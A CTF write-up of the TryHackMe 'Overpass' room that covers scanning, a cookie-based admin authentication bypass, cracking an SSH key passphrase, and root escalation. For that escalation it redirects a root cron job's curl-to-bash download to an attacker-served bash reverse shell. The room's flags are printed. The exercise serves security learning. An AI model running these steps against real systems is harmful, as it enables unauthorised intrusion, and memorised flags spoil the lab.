---
title: 'Tryhackme: Overpass'
date:  2025-06-25 23:00:00 +0530 
categories: [Tryhackme]
tags: [hacking, tryhackme, writeup, ctf, publisher, sudo, apt, nmap, gobuster, fuelcms, linpeas, reverse-shell, privilege-escalation, flags] # TAG names should always be lowercase 
render_with_liquid: false
media_subpath: /images/Overpass/
---

# 🕵️‍♂️ Overpass - 1 | Writeup | 25 June 2025

![TryHackMe Logo](THM.png)
![Overpass_image](overpass.png)

---

**Author:** *Aakash Modi*

---

# 🕵️ Reconnaissance & Enumeration - Task 1

## 🔍 Nmap Scan

**Command:**
```bash
sudo nmap -T4 -n -sC -sV -Pn -p- -oN fastscan.txt 10.10.5.56
```
![Nmap Scan Screenshot](nmap_scan.png)

---

## 📂 Directory Scan (Dirbuster)

**Command:**
```bash
gobuster dir -u http://10.10.209.74 \                    
-w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt \
-x php,js,html,css \
--exclude-length 1286 \
-o directory_scan.txt \
-a "Mozilla/5.0 (Kali)" \
-t 40 --timeout 10s
```
![Directory Scan Screenshot](directory_scan.png)

---

## 🔎 Web Vulnerability Scanning

**Nikto Scan:**
```bash
nikto -h http://10.10.209.74/ -o nikto_scan.txt
```
![Nikto Scan Screenshot](nikto_scan.png)

---

## 🌐 Web Enumeration

- **Admin Page Discovery:**  
  ![Admin URL](admin_url.png)

- **Network Analysis of Admin Page:**  
  ![Admin Network](admin_network.png)

- **Session Manipulation:**  
  Set the cookie `SessionToken` to any value (e.g., `1`) to bypass authentication.  
  ![Session Manipulation](session_.png)

- **Admin Dashboard Access:**  
  ![Admin Dashboard](dashboard_admin.png)

---

## 🔑 SSH Access

- **Extracting the RSA Private Key:**  
  Copy the RSA private key from the admin dashboard and save it locally.
  ```bash
  echo "<RSA PRIVATE KEY>" > id_rsa
  chmod 600 id_rsa
  ```
  ![SSH RSA Key](ssh_rsa.png)

- **Passphrase Required:**  
  ![SSH Passphrase](ssh_passphrase.png)

- **Cracking the Passphrase:**  
  Convert the key for John the Ripper:
  ```bash
  ssh2john id_rsa > hash.txt
  john hash.txt
  ```
  ![ssh2john](ssh2john.png)
  ![John the Ripper](crack_hash.png)

  **Credentials:**  
  - **Passphrase:** `james13`

- **SSH Login:**
  ```bash
  ssh -i id_rsa james@10.10.2.81
  ```
  ![SSH Login](ssh_login.png)

---

## 🏁 User Flag

- **Flag:**  
  `thm{65c1aaf000506e56996822c6281e6bf7}`
  
  ![User Flag](flag.png)

---

# 🚀 Privilege Escalation

- **Check Crontab for Scheduled Tasks:**
  ```bash
  cat /etc/crontab
  ```
  ![Crontab](root_access.png)

- **Suspicious Cron Job:**
  ```
  * * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash
  ```
  ![Cron Job](root_pri.png)

- **Host File Manipulation:**  
  Point `overpass.thm` to your attacker's IP.
  ```bash
  sudo nano /etc/hosts
  ```
  ![Host File](host.png)

- **Prepare Reverse Shell Script:**  
  Place your reverse shell in `/downloads/src/buildscript.sh`:
  ```bash
  bash -i >& /dev/tcp/10.8.76.195/4444 0>&1
  ```
  ![Reverse Shell Path](path.png)
  ![Reverse Shell](reverse_shell.png)

- **Serve the Payload:**
  ```bash
  python3 -m http.server 80
  ```
  ![Python HTTP Server](python_server.png)

- **Start Netcat Listener:**
  ```bash
  nc -lvnp 4444
  ```
  ![Netcat Listener](listen.png)

- **Root Shell Acquired:**
  ![Root Shell](root_shell.png)

- **Verify Root Access:**
  ```bash
  whoami
  ```
  ![Whoami Root](check_root.png)

---

## 🏁 Root Flag

- **Flag:**  
  `thm{7f336f8c359dbac18d54fdd64ea753bb}`

  ![Root Flag](root_flag.png)

---

# 🎯 Conclusion

- All tasks completed successfully!
  
  ![Room Completed](completed.png)

---

## 🎉 Happy Hacking!

<div align="center">
    <a href="https://giphy.com/gifs/charlie-hunnam-gif-hunt-102h4wsmCG2s12">
        <img src="https://media.giphy.com/media/102h4wsmCG2s12/giphy.gif" alt="Charlie Hunnam GIF" width="400"/>
    </a>
</div>

---
